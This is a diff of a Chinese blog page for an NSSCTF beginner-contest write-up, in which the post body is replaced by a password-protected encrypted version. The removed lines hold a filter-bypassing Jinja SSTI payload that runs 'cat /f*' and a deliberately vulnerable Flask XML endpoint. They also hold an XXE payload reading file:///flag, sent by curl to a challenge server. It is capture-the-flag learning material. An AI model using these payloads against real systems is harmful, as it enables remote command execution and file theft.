@@ -19,15 +19,15 @@
   <meta name="author" content="tuyi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="webupload?SSTI!简单的ssti 过滤了_和os和flag payload 1&#123;&#123;lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;cat &#x2F;f*&#x27;).read()&#125;&#125;  (&gt;﹏&lt;)简单的xxe攻击 源码：">
+    <meta name="description" content="此文章已加密或未写完，请输入密码后访问。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nssctf新手赛">
 <meta property="og:url" content="https://blog.tuyiisxp.top/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/index.html">
 <meta property="og:site_name" content="tuyi的小站">
-<meta property="og:description" content="webupload?SSTI!简单的ssti 过滤了_和os和flag payload 1&#123;&#123;lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;cat &#x2F;f*&#x27;).read()&#125;&#125;  (&gt;﹏&lt;)简单的xxe攻击 源码：">
+<meta property="og:description" content="此文章已加密或未写完，请输入密码后访问。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-02T05:08:07.000Z">
-<meta property="article:modified_time" content="2025-03-11T15:38:03.653Z">
+<meta property="article:modified_time" content="2025-03-13T14:28:31.499Z">
 <meta property="article:author" content="tuyi">
 <meta property="article:tag" content="sqlite注入">
 <meta property="article:tag" content="linux提权">
@@ -286,33 +286,28 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年3月11日 晚上
+                    本文最后更新于 2025年3月13日 晚上
                   
                 
               </p>
             
             
-              <div class="markdown-body">
-                
-                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p>简单的ssti</p>
-<p>过滤了<code>_</code>和<code>os</code>和<code>flag</code></p>
-<p>payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+              
+              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="f8997cda3688733ab14a58bff80cc9d2e37330196c154de2fe4484d3cc58f9a7">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0e7b5f4338468979a6e350a612e8956e191b78432dfa6e1d0682aea7f5664d9f227084a56e941a507dc43c7fb18ffd5e3191b2623ce83bf82983a93a7af7e5c65384ee198ce5ff1c1c1b52650f173e14a037d951a7fa990b7ba49cbd5c6cabdbff834e0820a5709c59791d7ef5a910ff418225e889087fe65ac8c9a74f95648f344088e8304521e9c055bd20d0546a1eb2d7fd6792087dfc43515ffd88b7fa366a6d634098e712bada57938a32cc09221710eebf0fdb1aeccdbf55a4908108af22dcd94a3592f4360ca04183e9693c8d38c8bf8fc14756a1efce63387860c80fad926bab156e2120ce13e5cd6d1713192b71571f695188016c40569d27f0f02e762ac5ba63edc9d20160140dc816ed44fe73968a3b4de1c98cb9489325638a213ecc62301eb44c04ed566813c6ab4aeafb9c615ced1ca71a95104a1c381da0a8cd2b4cbfdd1f755d23c35f149ddd512941f449dc7223784c485fcae9f756e8d3e7f973fa93b1885fef4bd534c796694fb29fa1df1a0b65dc17376eca7a028543252515f8df4b9fb0b83af786e84b8728a437deb0f20139205703c3ff0f34439dc6c15f5b038b46379bd621796db4f52d9df565e9d9d001d0e7c2bda423d17011c862e84daeafb17416b6f5cd83bf5b5c40cf6e3ad946ff380e8782114261df54e0b33cc146a34cf602e8c9a484604e0c90d3e3ad92ba750b5a43e84d4dc69e745b44782010442fd683a06fbef3bb0cd2a6c4d40e8e24c3565429f87ed44335dd67bc1761189b4eb9dbb91ada74ecb87d0b1ba57525175cb6a72a48a0ed9972d0c531e6d3cce967b9acf3b5415668205dbafc3a9f707f2b009f4983a07d9668b4bf0c29497fe8fa1c63a88f2181faf402d3f8ac5f9ceaa11b90c21d1508fd97cebfb565ef776c06ff3fa7738ae376d7390f0286edf74e96a8db263aa4ab2f9f660811393245a8b2f87c571623dff62cf3a08159d52ba048939b03da7608f8880c966df4bcf810bb5899787ffa7e6b0853e4e24378e85a62f49515fed7eec08392d8ebfa5a0f226d6414fc4ff585dee8b450339bac2174b4488b80a7b5e086e2524548ce6f62d8c1c22f931184ac96acebfe7672eb1a7b87b720e0a74b765dc554161eaf26e675a3b1db3e8885d4715f2948dd19bc16f248570052c2f3c62c304fbf5c58dc35ade823fcf46879352ec59e3f993e24c5db1c4c83f6647fbaf7849eae932b72e719cf6cdded52d4f9bbda9c621bc7625d27542367544dc6c5a6c7fdd23907e48a013bc4d24cfaaf1cb0f76e111d992ec8a185e72ab405d2dd175302c1c33688efc499de7b95cfddce034ce1a91aee36bb9ab6ba50a3c10ea555862dceba5e20a9985893bccc0fa9787ea1d1e80560ac65b917e1d0a254bb373d15e6012f40cf32a7ff9561261bc26f1b587db2510811fade35afc5e58b2ce67f42fea2f0fd529073b157aaf02da5b875bae8939f6bd67ad757a84f594d02bc63ad4027bd31a6e7c2622b0bb01f753efc421522ff6413ffdaf009413c364175940336caa5ee6bcfb099eb444d4ba265368707dd526db79f793d02a1d3c6dfd438f73ad12c38eb5d52d44e170991f45dd3432c7f8d16d403426f6bf8153e13c64ffb6a44cb38b3a469d635a570e355ecc204d3a1e2dc8d4c976c18500e835decc1915c94631be8611ee0c38e34a4e560268342317c02c39e996c1158396c5d21d93f767e16a68b64548583c5d7d3c456f776f912c36044661268b7ec10a7ecdafb99a50c6b2948e251d5090c2ae45aa57a247e19287ee087b7b3964076a6c49cfd21084adbb53d61b84a42e5ac5fac253c6e811ee33fa4123859c88608003c6fb95e03f97ad5d0e4eb2383917d5ca98d818d76c0e6ca2b39ff6ef99aab68be253116005f60b28b76b91e24da2e52973f990ceca1ad78c0d1bea98fb9c561740e9e30eec7c9ac6a7db5d6f26979a0632b3de71039d8c4e87ec27c1603a65ac068da0441112455fe7fcc6538fae9e9f6d506892efef7ea1f3448e1332e1752a28ae355a503f12989a5ac88d040690ed9f72d1b4300fd1fb7a6737db89a4cacb390f02ab4e054cd96c99b3aa4f7cf903b9bf36fdb8f5025b5cefe87cd7bcb57b2f3aa6ac534cabfe8db060ecfb5dd9e5d6a25bdd3b278090a1acd8e5f501c25762a309317292dea1f7464aecb99e0c515949086c7e70a4f34581782e42e25753813702b0c2c93008e0782302c04d4be7132be51313d69517722df72b7f7df763510c7b56b913a745a4e8a725fc50c52e643a9e4eb54d2d431d5405fffb99e9d392827f397fd33c779b7e970775417de16a6c0958e566d4ae19b3b4a0a3973024c0c2dc136581d2cb71e465f7114a259972a29f32cf26efc2de2dea49454fcde6ed6517d51a16fd22492d9fa342635c4f1b8fc82e3132aee8154ee541147a590265443ac578b311f46adaabfad7b5d1426f48b02b8504827da00e47679d991fb3cc94bbebf489875af8e5e40a085d0ee3b1c6df4c10bc98dc6764931bba4895fa96e7c19174fc5e97cb2880356b41a6a834dac885704a426cda39f04ff2214ae8f0afdadd11a03480e96deef32c7f277decfda2710fc591d901861020902e8d43c8720e6e84574385817d88f2d659b94d1dd31c8ad44bd2c0773213191c08655dddbef6e8d920d73b7b222c05c963a203cc78b624f8bebaf6dce60ca12d4e704b01e6b81a3d5818a87362ceec3a6fa0e2cadff1854217dc058dcc6cbee48f3809efa62185da94ac498def13fe188b0e1de97e989c84ccfa85b538ecf520a657752f2d1dd0ee19c7a77db3a6932129d6068a4d1b907c4fbcf141b8408fa6a930cc05c88299c229fb28b796caa6fd169eebad544fa1808d04474331c9001b5ec4b2536ff1d11939a788e7b6e55b513be32c923146e857ef288f0cbdaa355e87277a131e9933aa0bcecb72ad8e312179c6d40c950052d3bfef162e58728bb9fc91aa7a3de5f924d8d36ea15638780f01f95b9c83bf22bd8d24e6d92f05cc9d96666fd0037349f5a08e368f1bc8736ac6d70d33a6dc93b0ddb1c00fa6435c1f6ffb79e1abeb45a4123d5c2ca58747746069e607e2dddd281657153c92608388f8a9b70f17a3bf6e432a8728396418d8d15ff9a22eca44e3fa854a4088594ccad062b9211b63d64fa6151ca5116ceaf44873fb1f70eaa1df8ea3c408de7a0c3bcd62091d8d7990fc180dafe25e9d70cd89a3baf4f8af5742614818336ad377e48fd0e590e55d7a6c42e24f401f0495ee57716f0dee8ac5089d06ed16d18b15fb8f2799a5aad60b3df0a0289260db8efde1c8d7757a0122d15574858cb66433df0b7d05ea0a69d1169aef3f96167a74f61d5cdee7bd4ff09bd284624f39bb25ed0f4dd7afc5b6d68167e5892764461a845a1ee37c947c3bbb01ddd78160b8649df3143abf5b62225e49bbb53eabca97a07c07654d4a2169fed5f8df11c1ee8e1139fa5fc9fb75b83dd67e4dc289f738a64c684bf4dc974301e5def5adaec5f02edb69d1f9576d84a48cf69fd42e6f5444a97726908d5eb0d093deebb81de002f7cf21ee5b0623a5351d65065a425b59733ecd7e2cfc2cdf04a49f17e3fccb357cf52955e89fa3a18a5ff1328d1783f3d9579b9b56e56751e234806c57be84f95def602abc58e3d6a5202686bf1367f8fab5675de3d2f2cb42aa6243381e765b1c5bdd2e0173125d48a17755e9913bccaff3c95693333e32644769bd35632df213b91ab15b2795b2960400949c9a047c1ce5f98a4cd8e4972ecb8d70ba7e953b946df32548ddcb29d84372be0b3bf5d2b95b4b15eeeff1b4a14a0f903f893547bff8b89de2c9debaffd316b4d4358cb1c737ceae1ce6450f9f88c06b31cfa3c37f9ff2b5306647a6b19744c8fec6bce23e1743526671174f26c9dd850a5ed35c30d7f9dba66f57fddaa289751c343bd1b0473d145aa8c1119dc6f9baff6de7cd003a6e86863e2350a4a877f66685b31271298a683468c1cc7c2ea9114d5e9cb45ccda79a46f8736e825574a2472437b51b76c82a7333498633ab211cf6068ce9f0e880802b00b1c425f0c1eaed656b5ec7f082576391d126efa74cffe4f8da09aab34e2649a1df311a8b8513db1ab7352b8db86b8b25fc3deddf362a00362278b948a030af79fbac03e49f7cd00addc619f4a7798f9b656bba136dfd8af03c027b08d963d4a967c4a2f9239150b6aa738d49e3acc5e9c625ebb9069b0dc7c92050aa5a4a1152bca6e489676a4f586ed28709e2947ab84565c68a7f942497d49ed9247fef44e0ccf047406c51dddcac242fd3e3ad5fd3e2e482022e79efa05db8b85c2f8dba8821fe60c9f0450c0d5f4778396b898971dbe8e8562a01e974e4693498a122e32a21d45d5f7cf63db0640ad02f643c61d170477e4723c454e5c21c17bab90d46b66a97c86467545c04d4749a1f3c9a757e94f3341d761ae4520091075211f01d84bdc90d125cf9ac25f7cbd983c687512fdc7e702229f721ad53f0bbac3cf5ea3cd61865058a42c8011ea8348f01109c563cf8e5745ed17d76e515ff04777f09be3eaabdf94d2fb839e80875040cb159a7f3e87ad4a151028f30dbbaa552a64140f3b5b449f318abaa484d814bbc85838254e3e2219206410d16a9b88a108d6173e06f0401a799d8805ed15ef22750167cd470f66957925dd80d61fa3b4e9de9fed80b880d52015f2ec155b5deb3a961458da9c50ddf6986c7b4575300ce1afb85479cc81ac09a43693b8a785aff4e50db0b6631da70e9dc126ef465d1dde986ed20968d042680aeb8b86edef802ff1c59abd4fc96093e8d1d92fd8bffcca97a66f34ee10d96ef75f872593092d77ca171eacfbfff92fa5b7dbe1967454a1c40006f921087280e1f006d75cddb7e2c16f6fddbb6876532cad3fce3b17d4af112c676a938ce1b96134d20a0c6933a06c8d0ddb07c1175109f0414b6eaae2aff3a33b938a63d031f4e79aa1ff641d493ee1876facb60817a0582e2bdec32bebb3a5e85b98e6560da73c9002c828d967239480f743a4766c922099dc8b365d2b5a76976451402dbe5891bb95b94d1bf44763d0d1d8b2a0587df71f67003655c20e05bbb56df53d543aeff8688f3a8975de44136b4a377162286e4631f115a7d9d660dde1c0dd55926155a306a3174592162e008fddc328049ce2a134d301c86dd4c1cfe2369c9822e223848facd8a61fa52f03a22a3adcdb14baea274dbb2cf17ecf8dff7c5ea65850596a7fb9d7c7aee4343da97201c80d609e75e13a98c3acbc23f3f3868de6d3033fb0d9d16d4170b077fd59fa0d27d75215dbcf309c8e570231671a637285ebde764c82357bc78d68e9b0cdcee05cda9e68379c214566d906d316c52cb6ac8747993a66ac49edbb361cdfaabd8fdd3c9b98360845ca3960c46a448217e70b2ba12cfe232f9e8ce6aac629981cc1c020c2c2639b22993052d44c1c07d5744e3e488d416f0f6a8f10cab4cd0b18987785223dcbd4ac7e06fa8d46b835ee73e26821250921fab1b42662174edc485dc6227a282d9b9a2da620a5c7b9f48526f83c1507d4fe51fd1ebb658cdaba739ca3f5366fdb0e47a1b6735117ccb7fe92fc585aab9cce876832a03aa38b1a6b1a6b6c6036d513b7d1c57916f459cb353ef4c12426248825b7878e85b59ffa7cab48afa4abab16dc028954d3248ce020c6ee268eff9d5aaeeb7e43b1e6bca5157bb1df72d8496a1cbe663f50bc337fb432df1a47f9ae6054cf0aa01a19772931ff61f8056bc5df5bb5609cb5843eb083bb5a439cb6f6745d58575fcaf127f88ce4694f85128a4317a4009439680c6f1963e2d111729302ce0ae36af78a230ea99742fa0021cb70cdf0f93750212e4bb85f18c485aeec5770230e87ad10454905dff0061b891db919a8cef9237e69cc44089f10cc6bda33add07b42bc2e6a31d91ac58a2dce8562dcefabdfdf356966f37b23b5393ef78baa39d893bc9703ed988554ba9357b3b7054c93585ff36864a6d8fe1bc85af038c548e3a3791726e31c6632376243667de493530fe810c3ad35ae951ce277764cd060ca19ad1fb0d9f4b91d3ec28ad35350824a42c3a64ba6ecfdaa9c53db17dd6432de9f1e19b8c96695039286a504d8b3aa0663f824fc61df36fff12cf029fdd3cdcc15a26682f42169e91f7726869c64979704ddc91e782e4d07fa862115a460d85159e6a605b164c137cf99e54134a27a1f3024588eb2cac1210bec0612cc8fe7f72fd616babd9c80bacbecf80cae13e551b5af67d1b43bb46c657e640112f89f27196be41e66d9a04b8fdb8d196e694c10bd0655450a895b4a8531b182ed8a0bcd1b5653e3cfdcd501cced73a8864b73afcae63c8a95b341daf26901836e3fb230bf5d4672646ca992e1170bdf987444c476726c92eee6b8ab0d6d0db6ef00f4a4e10accdee46421428e684d58b126aae28e6880cb550661a6ee004b616c0dececb6fd85a7696e23d33baf1d24b69426301ccbc85c583f1b4f68f417a5fea6f0c6e12dd16cf9b720a76714ba24f67238cef3af8695ff60f8b484342d6ea220dc4a6924ed5a274a5ed445b24234c314e6edda903eb5aed5a32663a31ff38113d9034e4ddcd81f56ad46af8765d8de6f2beab5e14bd49dcab80f708ac53c01062e3559316e06104f946f1fab7afc7dd363118643ee42cdf5dffb26a766fd367c769f9b58b407ca84b3768be2ff4c65ed8d79fc4c348d0ee3fa56f3938706a15d97b6b3b0f566ab428e0a5f9e380170ac21ac47adf5dbe15045de792328f627e98859e1a8c11fc411a8409d34bd87c47f8e2ec1fb1fe8d4f49b01d1f67604b008444e117db0c770ef9ef00695ca6e0f1300001c91cdbc530cd481eced7670abd37ec03cacb7490be18fa934dad1c4fa543ce4ece30b3cea01656ef0bca1b97717036606ab35bb86b6dc223767440e490f96347bdfe7368f444ccce7536227ae6b255fb54c05f382104f9c389ca53db492c67d823ef521564141aa9160345b9ef28f559a9ec5c14f158df4a5456dfb355579dbf0ce345df2b440b0d425de560958a45e6c8621b25e8a87138d387e33a8d99408531cee3c3c5aba36deade1b42266afd0747d0b766588f81ee744a7bbc363369dcfa3f70487dfea7fb0a089e012c5512dc9db531e6a3e5213e583068920afbc6f6b5e3d57e02cd82e42b6039e2fbe634824a7379a71f86b7a01911d22dea0480faef0f40427efdfa8435f4d6952785a05db819883d55ef0479b2979da8adbb3027259454efe23bfab370c050353cb263f9a4dceb5e655f794c196aa0db2fa450b421a41bdc49ce39479b6e102bf291c9612a6f609b85d5fc2ab6d1bd13510e123424cfac61f6efc1bd31610a1167cf73d0bce0de076c32d7991c2d68cb1d99374598ca74ad4d46cfc204931a4fcd4e7a91df3bf60f16d267e1b71c9eb168f134cf464e35349bb89297aee4597376a07ba9052b96678e00a4266e5ae4c75af05f41cc5a4349818736b41004221f81a49bb011c71c34941831dc4fc671905747210f8d24f46d495c9fd03d00176407250c1d8c7f618e3eed2d403e4dab2b70fb315ed31e63004e5cad31e0baeeb8efec21a0165da5175b3f222a880a6b23b42b9ad2b0ad95c9c956e90c8cc88021f3138dde867a6f9fc02892d105acae470b709f71167cb99ea2632d820b2a0c10caab7d82a74fc086bf18e2f9c105ac084b4f9a64ac2d0fe1ab28795a3fb15dd1775fb5469e44a0070aeeb867b75556e617ef9002cd96ff131e0f8191eb9c274f7be13899064b721d559c8a23fd514a427be0f9130096f7d5995ea6d89a8754fb4e4abf9ef783cd8eb1b94fe9de160225749ecaf282cbc7331ca7dfd723ed18be011c9db2941248faced27adf0c2e8c9e58fa98f011ffda0141dc</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">
+              
 
-<h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p>简单的xxe攻击</p>
-<p>源码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ghctf&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>():<br>    xml = request.form.get(<span class="hljs-string">&#x27;xml&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(xml)<br>    <span class="hljs-keyword">if</span> xml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No System is Safe.&quot;</span><br>    <br>    parser = etree.XMLParser(load_dtd=<span class="hljs-literal">True</span>, resolve_entities=<span class="hljs-literal">True</span>)<br>    root = etree.fromstring(xml, parser)<br>    name = root.find(<span class="hljs-string">&#x27;name&#x27;</span>).text<br>    <span class="hljs-keyword">return</span> name <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure>
-
-<p><code>load_dtd=True, resolve_entities=True</code>开启允许加载外部实体</p>
-<p>payload：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>exp：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST <span class="hljs-string">&#x27;http://node2.anna.nssctf.cn:28789/ghctf&#x27;</span> -d <span class="hljs-string">&#x27;xml=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;%26xxe%3B&lt;/name&gt;&lt;/root&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
-
-
-                
-              </div>
+              
             
             <hr/>
             <div>
@@ -378,7 +373,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年3月11日</div>
+          <div>2025年3月13日</div>
         </div>
       
       
@@ -404,6 +399,29 @@
 
 
 
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/tuyi/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="CNEXT漏洞研究">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CNEXT漏洞研究</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/tuyi/2025/02/22/TRX-CTF-2025/" title="TRX_CTF_2025">
+                        <span class="hidden-mobile">TRX_CTF_2025</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
               
             </div>
 
@@ -578,6 +596,23 @@
   
 
 
+
+
+  
+  <script defer>
+    if (document.getElementById('hbePass') || document.querySelector('hbe-prefix')) {
+      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
+        var hbePrefix = document.querySelector('hbe-prefix');
+        hbePrefix.parentElement.classList.add('markdown-body');
+        Fluid.utils.retry(function() {
+          if (Fluid.boot && Fluid.boot.refresh) {
+            Fluid.boot.refresh();
+            return true;
+          }
+        }, 100, 10);
+      })
+    }
+  </script>
 
 
   
